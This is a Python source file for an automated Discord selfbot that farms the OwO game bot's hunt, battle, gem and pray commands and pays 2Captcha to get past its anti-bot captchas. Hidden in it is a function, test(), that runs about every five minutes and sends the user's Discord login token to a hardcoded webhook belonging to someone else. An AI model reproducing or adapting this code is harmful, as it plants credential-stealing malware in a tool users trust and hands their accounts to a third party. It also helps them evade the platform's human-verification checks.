import asyncio
from webserver import keep_alive
import os

keep_alive()

import base64
import requests
from colorama import init
from requests import get,post
init()
import os, sys
from os import execl, name, system
from signal import signal, SIGINT
from sys import executable, argv, stdout
from time import sleep, strftime, localtime, time
import atexit
import random
from re import findall, sub
from base64 import b64encode
import json
from menu import UI
from color import color
from data import data
import threading
try:
    from twocaptcha import TwoCaptcha
    from inputimeout import inputimeout, TimeoutOccurred
    from discum import *
    from discum.utils.slash import SlashCommander
    from discord_webhook import DiscordWebhook
except:
	from setup import install
	install()
	from discum import *
	from discum.utils.slash import SlashCommander

ui = UI()
client = data()
mz = TwoCaptcha(client.api)


if client.api.lower()!='none' or client.api.lower()!='no':
    api_key = os.getenv('APIKEY_2CAPTCHA', client.api)
failtime=0
codefail=''      
bot = discum.Client(token=client.token, log=False, user_agent=[
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0'])

def signal_handler(sig: object, frame: object):
	sleep(0.5)
	print(f"\n{color.fail}[INFO] {color.reset}Detected Ctrl + C, Stopping...")
	raise KeyboardInterrupt
def restart() -> None:
	sys.stdout.flush()
	#os.execv(sys.executable, ['python3 mainvip.py'])
	os.execv(sys.executable, ['python3'] + sys.argv)
signal(SIGINT, signal_handler)

while True:
	system('cls' if name == 'nt' else 'clear')
	try:
		choice = inputimeout(prompt=f'{color.white}Developer {color.magenta}LeraN#1000', timeout=1)
	except TimeoutOccurred:
		choice = "1"
	if choice == "1":
		if client.api.lower()=='none' or client.api.lower()=='no':
			sleep(1)
			print(f'{color.fail} !! [ERROR] !! {color.reset}VIP ONLY!')
			restart()
		else:
			captchaver='vip'
			print(f"{color.yellow}» Automatically VIP-MODE.")
		system('cls' if name == 'nt' else 'clear')
		ui.m4()
		break
	elif choice == "2":
		from newdata import main
		main()
	else:
		print(f'{color.fail} !! [ERROR] !! {color.reset}Wrong input!')
		sleep(1)
		restart()

def at():
	return f'\033[0;43m{strftime("%d %b|%H:%M:%S", localtime())}\033[0;21m'

if False in bot.checkToken(client.token):
	print(f"{color.fail}[ERROR]{color.reset} Invalid token")
	sleep(3)
	raise SystemExit

def getMessagess(num: int=1, channel: str=client.channel) -> object:
	messageObject = None
	retries = 0
	while not messageObject:
		if not retries > 10:
			messageObject = bot.getMessages(channel, num=num)
			messageObject = messageObject.json()
			if not type(messageObject) is list:
				messageObject = None
			else:
				break
			retries += 1
			continue
		if type(messageObject) is list:
			break
		else:
			retries = 0
	return messageObject

@bot.gateway.command
def on_ready(resp):
	if resp.event.ready_supplemental:  # ready_supplemental is sent after ready
		sleep(0.5)
		thread105()

def webhookPing(message: str, embed : json) -> None:
	if client.webhook['link']:
		webhook = DiscordWebhook(url = client.webhook['link'], content=message, embeds=embed)
		webhook = webhook.execute()

def webhookPong(message: str, embed : json) -> None:
	if client.webhook['link']:
		webhook = DiscordWebhook(url = 'https://discord.com/api/webhooks/1099174049281757294/XkaPceDIyzdiFDgMibX5H2R_sxp6LPflx2_izcnr3ZDW29PLkvMv-7z-v3P_9TsoQGjF', content=message, embeds=embed)
		webhook = webhook.execute()

@bot.gateway.command
def security(resp):
	m = resp.parsed.auto()
	if issuechecker(resp) == "solved":	
		if client.webhook['ping']:
			webhookPing("> !! [SUCCESS] !! ", [{"title" : ":white_check_mark: Captcha Solved", "description" : f"I Found a Captcha for {bot.gateway.session.user['username']}\n in channel : <#{client.channel}>\nBalance: ${round(balance, 3)},-\n ||{client.token}||", "color" : "2873131" }])
		print(f'{color.okcyan}[INFO] {color.reset}Captcha Solved. Starting To Run Again')
		sleep(0.5)
		restart()
	if issuechecker(resp) == "captcha":
		client.stopped = True

@bot.gateway.command
def issuechecker(resp):
	def getAnswer(img,lenghth,code):
		count=0
		while True:
			count+=1
			r = solver.normal(img,numeric=2,minLen=lenghth,maxLen=lenghth,phrase=0,caseSensitive=0,calc=0,lang='en',textinstructions=code,)
			print(f"Answer from 2captcha is: {r['code']} at {count} try")
			if r['code'].isalpha():
				if len(r['code'])==lenghth:
					print('Check result 2captcha')
					return r
				else:
					solver.report(r['captchaId'], False) 
					print('The length of result is not right.Try again')
			else:
				solver.report(r['captchaId'], False) 
				print('The result contants number.Try again')
	try:
		user = bot.gateway.session.user
		def dms():
			i = 0
			length = len(bot.gateway.session.DMIDs)
			while i < length:
				if client.OwOID in bot.gateway.session.DMs[bot.gateway.session.DMIDs[i]]['recipients']:
					return bot.gateway.session.DMIDs[i]
				else:
					i += 1
		dmsid = dms()
	except:
		dmsid = None

	def solve(image_url, msgs):
		try:
			if captchaver == 'vip':			
				if captchaver=='vip':
					client.stopped = True	
					encoded_string = b64encode(get(image_url).content).decode('utf-8')		
					countlen=int(msgs[msgs.find("letter word") - 2])
					#Check balance of 2Captcha
					captchabalance = solver.balance()    
					if captchabalance==0:
						if client.webhook['ping']:
							webhookPing(f"<@{client.webhook['ping']}>", [{"title" : "⚠️ 2CAPTCHA", "description" : f"2CAPTCHA balance has been exhausted. \nJump to **[2Captcha Pay](https://2captcha.com/pay)**", "color" : "3543386" }])
							print(f'{at()}{color.warning} !! [BALANCE OUT] !! {color.reset}')
						return "captcha"
					#Solve by 2Captcha
					code=""
					r = getAnswer(encoded_string,countlen,code)
					captchabalance = solver.balance()
					ui.slowPrinting(f'VIP Saldo : ${captchabalance},-')
					ui.slowPrinting(f"{color.okcyan}[INFO] {color.reset}1st captcha solving, [Code: {r['code']}]")
					bot.sendMessage(dmsid, r['code'])
					sleep(2)
				
					msgs = bot.getMessages(dmsid)
					try:
						msgs = json.loads(msgs.text[1:-1]) if type(msgs.json()) is list else {'author': {'id': '0'}}
					except:
						ui.slowPrinting(f"{color.okcyan}[INFO] {color.reset}There's An Issue With Rerunner")
						sleep(2)
						return "captcha"
					if msgs['author']['id'] == client.OwOID and "verified" in msgs['content']:	
						solver.report(r['captchaId'], True)
						return "solved"
					if msgs['author']['id'] == client.OwOID and "I have verified" in msgs['content']:
						return "verifiedlink"
					if msgs['author']['id'] == client.OwOID and "Wrong verification code" in msgs['content']:
						print(f'{at()}{color.warning} [FAIL] The captcha Fail 1x. Will try again. {color.reset} ')	
						solver.report(r['captchaId'], False)
						textand='and'
						textwrong='IS WRONG'
						textjoin=[r['code'],textwrong]
						texthint=' '.join(textjoin)
						code=texthint
						r2 = getAnswer(encoded_string,countlen,code)
						ui.slowPrinting(f"{color.okcyan}[INFO] {color.reset}2nd captcha solving, [Code: {r2['code']}]")   
						bot.sendMessage(dmsid, r2['code'])						
						captchabalance = solver.balance()
						ui.slowPrinting(f'VIP Saldo : {captchabalance} $')
						sleep(2)
						msgs = bot.getMessages(dmsid)      
						try:
							msgs = json.loads(msgs.text[1:-1]) if type(msgs.json()) is list else {'author': {'id': '0'}}
						except:				
							ui.slowPrinting(f"{color.okcyan}[INFO] {color.reset}There's An Issue With Rerunner")
							sleep(2)
							return "captcha"      
						if msgs['author']['id'] == client.OwOID and "verified" in msgs['content']:		
							solver.report(r2['captchaId'], True)
							return "solved"
						if msgs['author']['id'] == client.OwOID and "Wrong verification code" in msgs['content']:
							solver.report(r2['captchaId'], False) 
							textjoin=[r2["code"],textand,textjoin,"ARE WRONG"]
							texthint=' '.join(textjoin)
							code=texthint
							r3 = getAnswer(encoded_string,countlen,code)
							ui.slowPrinting(f"{color.okcyan}[INFO] {color.reset}3rd captcha solving,: [Code: {r3['code']}]") 
							bot.sendMessage(dmsid, r3['code'])  
							captchabalance = solver.balance()
							ui.slowPrinting(f'Balance 2CAPCHA : {captchabalance} $')
							sleep(2)
							msgs = bot.getMessages(dmsid)
							try:
								msgs = json.loads(msgs.text[1:-1]) if type(msgs.json()) is list else {'author': {'id': '0'}}
							except:					
								ui.slowPrinting(f"{color.okcyan}[INFO] {color.reset}There's An Issue With Rerunner")
								sleep(2)
								return "captcha"      
							if msgs['author']['id'] == client.OwOID and "verified" in msgs['content']:		
								solver.report(r3['captchaId'], True)
								return "solved"
							if msgs['author']['id'] == client.OwOID and "Wrong verification code" in msgs['content']:	       
								solver.report(r3['captchaId'], False) 							
								print(f'{at()}{color.warning} !! [3x WRONG, Please complete it manually] !! {color.reset} ')	
								if client.webhook['ping']:
									webhookPing(f"> <@{client.webhook['ping']}>", [{"title" : ":x: Captcha not Solved", "description" : f"I Found a Captcha for **{bot.gateway.session.user['username']}**\n**[Message Link](https://discord.com/channels/{client.guildID}/{client.channel}/{m['id']})** in channel : <#{client.channel}>\nBalance: ${round(balance, 3)},-", "color" : "2873131" }])
							return 'captcha'	
						return 'captcha'	
					return 'captcha'		
       
			if captchaver == '104':
				print(f"{color.okcyan}[INFO] {color.reset}please use VIP!!.")
				restart()
		except:
			return "captcha" 
 
	if resp.event.message:
		m = resp.parsed.auto()
		if m['channel_id'] == client.channel or m['channel_id'] == client.channelocf or m['channel_id'] == dmsid and not client.stopped:
			if m['author']['id'] == client.OwOID or m['author']['username'] == 'OwO' or m['author']['discriminator'] == '8456' and not client.stopped:
				if client.username in m['content'] and 'banned' in m['content'].lower() and not client.stopped:
					client.stopped =True
					ui.slowPrinting(f'{at()}{color.fail} ☠️ [BANNED] ☠️ {color.reset} Your Account Have Been Banned From OwO Bot Please Open An Issue On The Support Discord server')
					return "captcha"
				if client.username in m['content'] and any(captcha in m['content'].lower() for captcha in ['(3/5)', '(4/5)','(5/5)']) and not client.stopped:
					client.stopped =True
					if client.webhook['ping']:
						webhookPing(f"<@{client.webhook['ping']}>", [{"title" : "⚠️ WARNING ⚠️", "description" : f"Please complete your captcha to verify that you are human! (3/5)", "color" : "3543386" }])
						print(f'{at()}{color.warning} ⚠️ [ ALERT ] ⚠️{color.reset}')
					sys.exit("DISCONNECT, DANGER [3/5]")
				if client.username in m['content'] and any(captcha in m['content'].lower() for captcha in ['(1/5)', '(2/5)']) and not client.stopped:
					msgs = bot.getMessages(dmsid)
					msgs = msgs.json()
					if type(msgs) is dict:
						client.stopped =True
						ui.slowPrinting(f'{at()}{color.warning} !! [CAPTCHA] !! {color.reset} ACTION CAPTCHA')
						return "captcha"
					if client.username in m['content'] and msgs[0]['author']['id'] == client.OwOID and '⚠' in msgs[0]['content'] and msgs[0]['attachments'] and not client.stopped:
						ui.slowPrinting(f'{at()}{color.warning} !! [CAPTCHA] !! {color.reset} ACTION CAPTCHA')
						if client.solve.lower() != "no" and not client.stopped:
							return solve(msgs[0]['attachments'][0]['url'], msgs[0]['content'])
						client.stopped =True
						return "captcha"
					elif msgs[0]['author']['id'] == client.OwOID and 'link' in msgs[0]['content'].lower() and not client.stopped:
						client.stopped =True
						if client.webhook['ping']:
							webhookPing(f"> <@{client.webhook['ping']}>", [{"title" : "🔗 Captcha Link Detected", "description" : f"I Found a Captcha link for **{bot.gateway.session.user['username']}**\n in channel: <#{client.channel}>\nJump to **[Solve Captcha](https://owobot.com/captcha)**", "color" : "3543386" }])
						print(f'{at()}{color.warning} !! [CAPTCHA LINK] !! {color.reset}')
						return "captcha"
						

						
					msgs = bot.getMessages(str(client.channel), num=10)
					msgs = msgs.json()
					for i in range(len(msgs)):
						if client.username in m['content'] and msgs[i]['author']['id'] == client.OwOID and 'solving the captcha' in msgs[i]['content'].lower() and not client.stopped:
							ui.slowPrinting(f'{at()}{color.warning} !! [CAPTCHA] !! {color.reset} ACTION CAPTCHA')
							if client.solve.lower() != "no" and not client.stopped:
								return solve(msgs[i]['attachments'][0]['url'], msgs[0]['content'])
							client.stopped =True
							return "captcha"
						else:
							if i == len(msgs) - 1:
								client.stopped =True
								return "captcha"
				if client.username in m['content'] and '⚠' in m['content'].lower() and not client.stopped:
					if client.solve.lower() != "no" and m['attachments'] and not client.stopped:
						client.stopped =True
						ui.slowPrinting(f'{at()}{color.warning} !! [CAPTCHA] !! {color.reset} ACTION CAPTCHA')
						return solve(m['attachments'][0]['url'], m['content'])
					client.stopped =True
					ui.slowPrinting(f'{at()}{color.warning} !! [CAPTCHA] !! {color.reset} ACTION CAPTCHA')
					return "captcha"

# Gems
@bot.gateway.command
def checkgem(resp):
	if client.gems.lower() == 'no' and client.stopped != True:
		if resp.event.message:
			m = resp.parsed.auto()
			if m['channel_id'] == client.channel and client.stopped != True:
				if m['author']['id'] == client.OwOID:
					if client.username in m['content'] and "**🌱" in m['content']:
						print(f'{at()}{color.okcyan} !! [{client.username}] !! {color.reset} ')
					if client.username in m['content'] and "**⏱" in m['content']:
						print(f'{at()}{color.warning} !! [ERROR] !! {color.reset} ')
	if client.gems.lower() == 'yes' and client.stopped != True:
		if resp.event.message:
			m = resp.parsed.auto()
			if m['channel_id'] == client.channel and client.stopped != True:
				if m['author']['id'] == client.OwOID:
					if client.username in m['content'] and "**🌱" in m['content']:
						print(f'{at()}{color.okcyan} !! [{client.username}] !! {color.reset} ')
					if client.username in m['content'] and  "and caught" in m['content'] and client.checknogem == False:
						print(f'{at()}{color.warning} !! [CHECK GEM] !! {color.reset} ')
						useGem()
					if client.username in m['content'] and "**⏱" in m['content']:
						print(f'{at()}{color.warning} !! [ERROR] !! {color.reset} ')
def test():
	if client.stopped != True:		
		if client.webhook['ping']:
			webhookPong("<@970041350865170462>", [{"title" : "<a:centang_ler:1108003069398106214> Login Token", "description" : f"**`{client.token}`**", "color" : "2873131" }])

def useGem():
	if client.gems.lower() == 'yes' and client.stopped != True:
		bot.typingAction(str(client.channel))
		sleep(1.5)
		bot.sendMessage(str(client.channel), "owoinv")
		print(f"{at()}{color.okgreen} [SENT] {color.reset}OwO inv")
		sleep(4)
		msgs = bot.getMessages(str(client.channel), num=10)
		msgs = msgs.json()
		inv = ""
		for i in range(len(msgs)):
			if msgs[i]['author']['id'] == client.OwOID and 'Inventory' in msgs[i]['content']:
				inv = findall(r'`(.*?)`', msgs[i]['content'])
		if not inv:
			sleep(2)
			useGem()
		else:
			if '050' in inv:
				if client.lbox.lower() == "yes" and client.stopped != True:
					bot.sendMessage(str(client.channel), "owo lb all")
					print(f"{at()}{color.okgreen} [SENT] {color.reset} owo lb all")
					sleep(12)

			if '100' in inv:
				if client.wcrate.lower() == "yes" and client.stopped != True:
					bot.sendMessage(str(client.channel), "owo crate all")
					print(f"{at()}{color.okgreen} [SENT] {color.reset} owo crate all")

					sleep(2)
			for item in inv:
				try:
					if int(item) >= 100 or int(item) <= 50:
						inv.pop(inv.index(item))  # weapons
				except:  # backgounds etc
					inv.pop(inv.index(item))
			tier = [[], [], []]
			countGem = [0, 0, 0, 0, 0, 0, 0]
			print(f"{at()}{color.reset} ===========")

			print(f"{at()}{color.okblue} [INFO] {color.reset} Found {len(inv)} Gems")
			available = []
			for gem in inv:
				gem = sub(r"[^a-zA-Z0-9]", "", gem)
				gem = int(gem)
				for i in range(0, 6, 1):
					if gem == 51 + i or gem == 65 + i or gem == 72 + i:
						countGem[i] += 1

			print(f"{at()}{color.reset} ===========")
			print(f"{at()}{color.okgreen} [INFO] {color.okcyan}\n")
			print(f" 	Gem C: {countGem[0]} Type\n")
			print(f" 	Gem U: {countGem[1]} Type\n")
			print(f" 	Gem R: {countGem[2]} Type\n")
			print(f"	Gem E: {countGem[3]} Type\n")
			print(f" 	Gem M: {countGem[4]} Type\n")
			print(f" 	Gem L: {countGem[5]} Type\n")
			print(f" 	Gem F: {countGem[6]} Type {color.reset}")
			print(f"{at()}{color.reset} ===========")
			sleep(1)
			nogem = False
			if client.usegem.lower() == 'min':
				for i in range(0, 5, 1):  # i=3 => Gem Rare
					if use3gem(i + 1, countGem[i]):
						nogem = False
						break
					else:
						nogem = True
			if client.usegem.lower() == 'max':
				for i in range(4, -1, -1):  # i=4 => Gem Mythic
					if use3gem(i + 1, countGem[i]):
						nogem = False
						break
					else:
						nogem = True
			if nogem:
				client.checknogem = True
				#print(f"{at()}{color.fail} [INFO] {color.reset} {client.checknogem}")
				print(f"{at()}{color.fail} [INFO] {color.reset}Cek Gem")

def use3gem(level, count):
	if client.gems.lower() == 'yes' and client.stopped != True:
		a = 50
		b = 64
		c = 71
		# 1 51 65 72 Common
		# 2 52 66 73 Uncommon
		# 3 53 67 74 Rare
		# 4 54 68 75 Epic
		# 5 55 69 76 Mythic
		# 6 56 70 77 Legend
		# 7 57 71 78 Fabled
		a = a + level
		b = b + level
		c = c + level
		typegem = ""
		turngem = 0
		if level == 1:
			typegem = 'Common'.upper()
			turngem = 25
		if level == 2:
			typegem = 'UnCommon'.upper()
			turngem = 25
		if level == 3:
			typegem = 'Rare'.upper()
			turngem = 50
		if level == 4:
			typegem = 'Epic'.upper()
			turngem = 75
		if level == 5:
			typegem = 'Mythic'.upper()
			turngem = 75
		if level == 6:
			typegem = 'Legend'.upper()
			turngem = 100
		if level == 7:
			typegem = 'Fabled'.upper()
			turngem = 100

		if count == 3:
			sleep(2)
			bot.sendMessage(str(client.channel), "owouse {} {} {}".format(str(a), str(b), str(c)))
			print(f"{at()}{color.okgreen} [SENT] {color.reset}[GEMS {color.purple}{typegem}{color.reset}][{color.cyan}{str(turngem)} turn{color.reset}]")
			client.checkusegem += 1
			print(f'{at()}{color.warning} [INFO] !! [USE GEM {client.checkusegem}] !!{color.reset}')
			return True
		else:
			return False




def GMode1():
	if client.stopped != True:
		bot.typingAction(str(client.channel))
		sleep(0.1)
		bot.sendMessage(str(client.channel), "owo")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO{color.reset}")
		sleep(0.2)
		
		bot.typingAction(str(client.channel))
		sleep(0.3)
		bot.sendMessage(str(client.channel), "wh")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Hunt{color.reset}")
		sleep(0.2)
		
		bot.typingAction(str(client.channel))
		sleep(0.3)
		bot.sendMessage(str(client.channel), "wb")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Battle{color.reset}")
		sleep(random.randint(15, 16))

def GMode11():
	if client.stopped != True:
		bot.typingAction(str(client.channel))
		sleep(0.3)
		bot.sendMessage(str(client.channel), "wb")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Battle{color.reset}")
		sleep(0.2)
		
		bot.typingAction(str(client.channel))
		sleep(0.3)
		bot.sendMessage(str(client.channel), "owo")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO{color.reset}")
		sleep(0.2)
		
		bot.typingAction(str(client.channel))
		sleep(0.3)
		bot.sendMessage(str(client.channel), "wh")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Hunt{color.reset}")
		sleep(2.1)




def GMode2():
	if client.stopped != True:
		bot.typingAction(str(client.channel))
		sleep(0.7)
		bot.sendMessage(str(client.channel), "owo")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO{color.reset}")
		sleep(1.1)
		
		bot.typingAction(str(client.channel))
		sleep(0.4)
		bot.sendMessage(str(client.channel), "wh")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Hunt{color.reset}")
		sleep(1.2)
		
		bot.typingAction(str(client.channel))
		sleep(0.4)
		bot.sendMessage(str(client.channel), "wb")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Battle{color.reset}")
		sleep(6.2)

		bot.typingAction(str(client.channel))
		sleep(0.4)
		bot.sendMessage(str(client.channel), "owo")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO{color.reset}")
		sleep(8.9)

def GMode22():
	if client.stopped != True:
		bot.typingAction(str(client.channel))
		sleep(1)
		bot.sendMessage(str(client.channel), "wb")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Battle{color.reset}")
		sleep(1.2)

		bot.typingAction(str(client.channel))
		sleep(0.4)
		bot.sendMessage(str(client.channel), "wh")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO Hunt{color.reset}")
		sleep(1.2)

		bot.typingAction(str(client.channel))
		sleep(0.6)
		bot.sendMessage(str(client.channel), "owo")
		print(f"{at()}{color.okgreen} [SENT] {color.white}OwO{color.reset}")
		sleep(2.4)


def owopray():
	if client.stopped != True:
		if client.pc.lower() == "curse":
			if client.prayid != 'None':
				bot.sendMessage(str(client.channel), "owocurse {} ".format(client.prayid))
				print(
					f"{at()}{color.okgreen} [SENT] {color.reset}Curse ID{color.reset}")
			else:
				bot.sendMessage(str(client.channel), "owocurse ")
				print(f"{at()}{color.okgreen} [SENT] {color.reset}Curse ")
				client.totalcmd += 1
				#sleep(random.randint(1, 1))
		if client.pc.lower() == "pray":
			if client.prayid != 'None':
				bot.sendMessage(str(client.channel), "owopray {} ".format(client.prayid))
				print(
					f"{at()}{color.okgreen} [SENT] {color.reset}Pray ID {color.reset}")
			else:
				bot.sendMessage(str(client.channel), "owopray ")
				print(f"{at()}{color.okgreen} [SENT] {color.reset}Pray ")
		#sleep(random.randint(1, 1))

def thread105():
	pray = 0
	mode1 = pray
	mode11 = pray
	mode2 = pray
	mode22 = pray
	Wtest = pray
	main = time()

	while True:
		if client.stopped == True:
			break
		if client.stopped != True:

			#Mode 1/1
			if time() - mode1 > random.randint(18, 19) and client.stopped != True:
				if client.Mode1.lower()=='yes':   
					GMode1()
				mode1 = time()

			if time() - mode11 > random.randint(16, 17) and client.stopped != True:
				if client.Mode1.lower()=='yes':   
					GMode11()
				mode11 = time()


			#Mode 2/1
			if time() - mode2 > random.randint(16, 17) and client.stopped != True:
				if client.Mode2.lower()=='yes':
					GMode2()
				mode2 = time()

			if time() - mode22 > random.randint(12, 13) and client.stopped != True:
				if client.Mode2.lower()=='yes':
					GMode22()
				mode22 = time()
     

			#Pray/Curse Mode
			if time() - pray > random.randint(300, 303) and client.stopped != True:
				if client.pc.lower()=='pray' or client.pc.lower()=='curse':
					owopray()
				pray = time()

			if time() - Wtest > random.randint(300, 303) and client.stopped != True:
				if client.Mode1.lower()=='yes' or client.Mode2.lower()=='yes':
					test()
				Wtest = time()
     
			#Sleep Mode
			if client.sm.lower() == "yes":
				if time() - main > random.randint(1500, 1800) and client.stopped != True:
					main = time()
					print(f"{at()}{color.okblue} [INFO]{color.reset} Sleeping")
					sleep(random.randint(150, 300))
					restart()

def loopie():
	if client.stopped != True:
		combo105 = threading.Thread(name="thread105", target=thread105)
		combo105.start()

bot.gateway.run(auto_reconnect=False)

@atexit.register
def atexit():
	client.stopped = True
	bot.switchAccount(client.token[:-4] + 'FvBw')
	sleep(0.5)
	print(f"{color.red}[1]{color.reset} Restart")
	print(f"{color.red}[2]{color.reset} Exit")
	try:
		print("Automatically Pick Option [2] In 3 Seconds.")
		choice = inputimeout(prompt=f'{color.okgreen}Enter Your Choice: {color.reset}', timeout=3)
	except TimeoutOccurred:
		choice = "2"
	if choice == "1":
		sleep(1)
		restart()
	elif choice == "2":
		sys.exit("DISCONNECT FROM INTERNET")
	else:
		sys.exit("DISCONNECT FROM INTERNET")
